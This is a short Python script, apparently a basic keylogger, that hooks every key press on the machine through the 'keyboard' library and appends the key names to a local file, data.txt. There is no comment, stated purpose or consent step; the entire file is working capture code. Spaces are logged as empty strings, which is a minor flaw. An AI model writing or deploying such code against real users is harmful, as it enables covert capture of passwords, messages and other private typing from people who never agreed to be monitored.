import keyboard

def teclapresionada(key):
    with open ('data.txt', 'a') as file:

        if key.name == 'space':
            file.write('')
        
        else:
            file.write(key.name)
keyboard.on_press(teclapresionada)
keyboard.wait()

